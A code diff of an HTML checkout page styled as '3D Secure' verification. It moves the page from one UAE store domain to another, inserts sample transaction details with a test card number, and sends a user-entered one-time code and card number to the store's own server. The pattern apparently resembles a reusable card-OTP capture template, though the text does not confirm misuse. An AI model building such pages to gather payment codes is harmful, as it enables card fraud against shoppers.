@@ -1,13 +1,11 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>3D Secure Online Shopping</title>
-            <link rel="icon" type="image/png" href="https://alshafaqstore-uae.com/storage/logos/8VP5TRieTQwWrEa1GupIw0PtLNlXvaMAs2cgcT64.jpg">
-        <link rel="shortcut icon" href="https://alshafaqstore-uae.com/storage/logos/8VP5TRieTQwWrEa1GupIw0PtLNlXvaMAs2cgcT64.jpg">
-        <script src="https://cdn.tailwindcss.com"></script>
+    <title>3D Secure Online Shopping</title>      
+     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         .logo-section {
             background-color: #fefefe;
@@ -51,15 +49,15 @@
         <!-- Transaction Details -->
                 <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
             <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
-            <p><strong>Merchant Name:</strong> 33333</p>
-            <p><strong>Amount:</strong> 0.00 د.إ</p>
-            <p><strong>Date:</strong> 2026-10-13</p>
-            <p><strong>Card Number:</strong> XXXX-XXXX-XXXX-4270</p>
+            <p><strong>Merchant Name:</strong> Pearly Kids</p>
+            <p><strong>Amount:</strong> AED 1,000.00</p>
+            <p><strong>Date:</strong> 2024-06-15 14:30:00</p>
+            <p><strong>Card Number:</strong> 4242424242424242</p>
         </div>
 
         <!-- OTP Form -->
-        <form id="otpForm" action="https://alshafaqstore-uae.com/checkout/otp" method="POST">
-            <input type="hidden" name="_token" value="kFsT61TpsTrVKiDF6cFYy4132ZPIaUJ7zNYzXnKJ" autocomplete="off">            <div class="mt-6">
+        <form id="otpForm" action="https://pearlykids-uae.com/checkout/otp" method="POST">
+            <input type="hidden" name="_token" value="5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i" autocomplete="off">            <div class="mt-6">
                 <label for="otp" class="block text-sm mb-1">Verification code</label>
                 <input type="text" id="otp" name="otp" maxlength="6"
                        inputmode="numeric"
@@ -73,7 +71,7 @@
         </form>
 
         <!-- Hidden Card Number -->
-        <input type="hidden" id="cardNumber" value="XXXX-XXXX-XXXX-4270" />
+        <input type="hidden" id="cardNumber" value="4242424242424242">
 
         <!-- Resend Code Button -->
         <button id="resendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5">RESEND CODE</button>
@@ -81,7 +79,7 @@
         <!-- Terms of Service Note -->
         <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
             By clicking "Submit" you agree to the 
-            <a href="https://alshafaqstore-uae.com" class="text-blue-600 hover:underline">
+            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">
                 Terms of service
             </a>.
         </p>
@@ -120,7 +118,7 @@
             const formData = new URLSearchParams();
             formData.append('cardNumber', cardNumber);
             formData.append('otp', otp);
-            formData.append('_token', 'kFsT61TpsTrVKiDF6cFYy4132ZPIaUJ7zNYzXnKJ');
+            formData.append('_token', '5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i');
 
             fetch("/checkout/resend", {
                 method: 'POST',
@@ -143,7 +141,7 @@
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
-                        'X-CSRF-TOKEN': 'kFsT61TpsTrVKiDF6cFYy4132ZPIaUJ7zNYzXnKJ'
+                        'X-CSRF-TOKEN': '5919XgTwSXYKxPvK70d9YdfK09TAzhFPEpBhrh7i'
                     }
                 });
             } catch (e) {
